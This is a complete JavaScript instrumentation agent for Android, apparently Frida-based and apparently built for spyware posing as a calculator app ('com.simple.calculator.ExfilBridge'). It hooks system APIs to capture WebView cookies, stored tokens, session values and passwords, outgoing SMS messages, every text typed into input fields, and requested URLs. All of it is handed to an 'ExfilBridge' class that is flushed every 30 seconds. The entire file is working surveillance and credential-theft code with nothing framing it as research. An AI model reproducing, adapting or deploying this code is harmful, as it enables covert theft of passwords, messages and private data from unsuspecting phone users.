Java.perform(function() {
    console.log("[+] Agent loaded");

    try {
        var CookieManager = Java.use("android.webkit.CookieManager");
        var cm = CookieManager.getInstance();
        var cookies = cm.getCookie("https://");
        if (cookies && cookies.length() > 0) {
            sendData("COOKIES", cookies);
        }
    } catch (e) {}

    try {
        var SharedPreferences = Java.use("android.content.SharedPreferences");
        SharedPreferences.getString.overload('java.lang.String', 'java.lang.String').implementation = function(key, defaultValue) {
            var value = this.getString(key, defaultValue);
            var keyLower = key.toLowerCase();
            if (keyLower.indexOf("token") >= 0 || 
                keyLower.indexOf("auth") >= 0 ||
                keyLower.indexOf("session") >= 0 ||
                keyLower.indexOf("password") >= 0) {
                sendData("SHARED_PREF", key + " = " + value);
            }
            return value;
        };
    } catch (e) {}

    try {
        var SmsManager = Java.use("android.telephony.SmsManager");
        SmsManager.sendTextMessage.implementation = function(dest, sc, text, sent, delivered) {
            sendData("SMS_OUT", "To: " + dest + " | " + text);
            return this.sendTextMessage(dest, sc, text, sent, delivered);
        };
    } catch (e) {}

    try {
        var EditText = Java.use("android.widget.EditText");
        EditText.getText.implementation = function() {
            var text = this.getText();
            if (text != null && text.length() > 0) {
                sendData("INPUT", text.toString());
            }
            return text;
        };
    } catch (e) {}

    try {
        var URL = Java.use("java.net.URL");
        URL.openConnection.overload().implementation = function() {
            sendData("HTTP_URL", this.toString());
            return this.openConnection();
        };
    } catch (e) {}

});

function sendData(type, data) {
    try {
        Java.perform(function() {
            var ExfilBridge = Java.use("com.simple.calculator.ExfilBridge");
            ExfilBridge.receive(type, data);
        });
    } catch (e) {}
}

setInterval(function() {
    try {
        Java.perform(function() {
            var ExfilBridge = Java.use("com.simple.calculator.ExfilBridge");
            ExfilBridge.flush();
        });
    } catch (e) {}
}, 30000);